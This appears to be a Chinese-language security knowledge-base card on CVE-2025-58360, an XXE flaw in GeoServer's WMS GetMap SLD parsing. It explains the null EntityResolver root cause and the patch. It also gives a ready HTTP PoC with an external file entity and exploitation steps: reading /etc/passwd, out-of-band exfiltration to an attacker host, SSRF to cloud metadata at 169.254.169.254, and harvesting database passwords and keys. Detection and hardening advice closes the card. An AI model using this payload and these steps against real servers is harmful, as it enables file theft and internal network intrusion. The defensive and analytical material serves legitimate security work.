---
id: web-generic-xxe-geoserver-wms-getmap-sld
title: GeoServer WMS GetMap SLD 解析 XXE：SLDXmlRequestReader 传 null EntityResolver（CVE-2025-58360）
type: scenario
domain: web
path: web/generic/xxe
technique: geoserver-wms-sld-xml-external-entity
aliases:
- CVE-2025-58360
- GeoServer XXE
- GetMap XXE
- SLDXmlRequestReader 外部实体
- StyledLayerDescriptor XXE
- EntityResolver null 解析
- OWSHandlerMapping dispatcher
tags:
- xxe
- geoserver
- wms
- getmap
- sld
- java
- xml
- file-read
- ssrf
cve:
- CVE-2025-58360
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V56
  verified_at: '2026-11-05T08:56:30+08:00'
  notes: '已对照原文核对：CVE-2025-58360、GetMap SLD PoC、OWSHandlerMapping→dispatcher→SLDXmlRequestReader 链路、PR #8192 中 parse(reader, version, null, null) 改传 ResourcePool EntityResolver，均与 2 张图片一致；原文未给受影响版本区间、未展示实际文件读取响应，卡片未写 affected_versions 且标 confidence medium，处理正确；PoC 未本地复跑。verifier-V61 于 90704 核对时依据该文明确区间补充 affected_versions（geoserver [2.26.0, 2.26.2)、[*, 2.25.6)，gs-web-app/gs-wms 同区间），特此说明。'
affected_versions: geoserver [2.26.0, 2.26.2) 与 [*, 2.25.6)；gs-web-app、gs-wms 同区间
---

## 一句话结论

GeoServer 的 `/geoserver/wms?request=GetMap` 在接收 POST XML 形式的 SLD 时，请求经 `OWSHandlerMapping → dispatcher(org.geoserver.ows.Dispatcher) → SLDXmlRequestReader` 解析；漏洞版本在调用 `Styles.handler(...).parse(reader, version, null, null)` 时把 `EntityResolver` 传成 `null`，底层 XML 解析器回退到默认行为、允许解析外部实体，攻击者用 `StyledLayerDescriptor` 内的 `<!ENTITY xxe SYSTEM "file:///...">` 即可读取服务器文件或发起 SSRF（CVE-2025-58360）。

## 原理

- **请求路由**：GeoServer 是 XML 配置驱动的 Spring 应用，`applicationContext.xml` 中的 `OWSHandlerMapping` 把 `/wms`（及 `/wms/*`）映射到 bean 名 `dispatcher`；该 bean 对应 `org.geoserver.ows.Dispatcher`。
- **请求类型选择**：`Dispatcher` 先用 KVP（query string）确定 `service=WMS&request=GetMap`；由于 Body 是 POST XML，它会先预读 XML 的 root 与 namespace，再在已注册的 `XmlRequestReader` 中按 `(root, namespace, service, version)` 选择 reader。root 为 `StyledLayerDescriptor` 且 namespace 正确时命中 `SLDXmlRequestReader`。
- **危险调用**：`SLDXmlRequestReader.read()` 中原本执行：

  ```java
  StyledLayerDescriptor sld =
      Styles.handler(getMap.getStyleFormat())
            .parse(reader, getMap.styleVersion(), null, null);
  ```

  最后两个参数中，`EntityResolver` 为 `null`。GeoTools/Java XML 解析器在未提供自定义 resolver 且未显式禁用外部实体时，会按默认行为解析 `SYSTEM` 外部实体——`&xxe;` 被替换为 `file:///...` 的内容。
- **为什么能读到文件**：攻击者的 XML 把实体引用放在 `<Name>&xxe;</Name>` 等会被解析并回显/进入错误信息的字段；解析阶段解析器主动读取 URI（`file://` 读本地文件，`http://` 发起内网请求），实现有回显文件读取或 SSRF。
- **补丁逻辑**：修复版本从 `ResourcePool` 取 `EntityResolver` 并传入：

  ```java
  EntityResolver entityResolver =
      wms.getCatalog().getResourcePool().getEntityResolver();
  StyledLayerDescriptor sld =
      styleParser.parse(reader, styleVersion, null, entityResolver);
  ```

  resolver 在解析外部实体前决定允许、重定向或拒绝，从而关闭默认外部实体解析。
- **根因**：安全解析依赖调用方显式传入受限的 `EntityResolver`；只要某个 reader/解析入口漏传 `null`，就回到不安全的默认解析行为，属于“安全默认缺失”而非解析器本身必然有洞。

## 触发条件

- 目标暴露 GeoServer WMS 端点（`/geoserver/wms`，或自定义 context path 下的 `/wms`）。
- GeoServer 版本包含 `SLDXmlRequestReader` 传 `null` EntityResolver 的旧代码（漏洞修复前版本）。
- 请求能以 `POST` + `Content-Type: application/xml` 提交，且 KVP 指定 `service=WMS&request=GetMap`。
- 解析器未被额外的全局 JAXP 加固（`disallow-doctype-decl`、禁用外部实体）覆盖。
- 有回显时依赖实体内容进入响应/错误；无回显时可改用 OOB 外带或 SSRF 探测。

## 利用步骤

1. 确认 `/geoserver/wms` 可访问，KVP `service=WMS&request=GetMap` 正常返回（或返回 WMS 错误）。
2. 发送 XML Body，root 用 `StyledLayerDescriptor`（带正确 namespace/version），在 DOCTYPE 中声明 `file://` 外部实体，并在 `<Name>` 中引用。
3. 观察响应/错误信息是否带出文件内容；Linux 用 `/etc/passwd`，Windows 用 `c:/windows/win.ini` 验证。
4. 若无回显，把 `SYSTEM` 改为攻击者 HTTP 地址做 OOB，或改为内网 URL 做 SSRF 探测（配合参数实体外带文件内容）。
5. 读取 GeoServer 配置、数据库口令、密钥等敏感文件；按需扩展到其他 WMS/WFS/SLD 解析入口。

## PoC

原文 PoC：

```http
POST /geoserver/wms?request=GetMap HTTP/1.1
Host: {{target}}
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE StyledLayerDescriptor [
<!ENTITY xxe SYSTEM "{{file}}">
]>
<StyledLayerDescriptor version="1.0.0">
    <NamedLayer>
        <Name>&xxe;</Name>
    </NamedLayer>
</StyledLayerDescriptor>
```

把 `{{file}}` 替换为 `file:///etc/passwd` 等目标 URI。原文未展示实际响应截图，PoC 完整性与回显效果需按目标环境验证，故 confidence 标 medium。

## 变体与关联

- **有回显 vs 盲 XXE**：`&xxe;` 直接进入响应时可直接读文件；无回显时用参数实体 + 外部 DTD 外带（见关联卡）。
- **SSRF**：把 `SYSTEM` 改成 `http://169.254.169.254/...`、内网服务 URL，利用解析器发起请求并观察时间/错误差异。
- **其他解析入口**：WMS/WFS/SLD/WPS 等 OWS reader 若同样漏传 `EntityResolver`，可能存在同源问题；审计 `parse(..., null, null)` 形式调用。
- **版本差异**：不同 GeoServer/GeoTools 版本的 reader 类名、`styleFormat` 处理与默认 JAXP 配置可能不同；以实际版本补丁对比为准。
- **关联卡片**：[[web-generic-xxe-inband-file-read-default-insecure]]（Java 解析器默认允许外部实体的通用原理）、[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（XXE 驱动 SSRF）、[[web-generic-xxe-saml-acs-parse-before-signature]]（解析先于校验的 XXE）。

## 检测与防御

- **升级/补丁**：升级到包含 `EntityResolver` 修复的 GeoServer 版本（参考官方 PR #8192 及安全公告）；核对所有 `XmlRequestReader` 的 `parse` 调用是否都传入受限 resolver。
- **解析器加固**：全局设置 JAXP `disallow-doctype-decl=true`、禁用 `external-general-entities`/`external-parameter-entities`、`FEATURE_SECURE_PROCESSING=true`；禁止 `setExpandEntityReferences(true)`。
- **网络与权限**：GeoServer 进程最小权限运行，限制其对敏感文件与内网/云元数据的访问；出网白名单，阻断解析器发起的非预期请求；WMS 端点按需暴露、加认证。
- **检测**：请求体含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://` 且发往 `/wms`；响应/错误中出现系统文件内容；GeoServer 日志出现外部实体解析异常、非预期 URI 访问；监控进程读取 `/etc/passwd`、配置文件等行为。
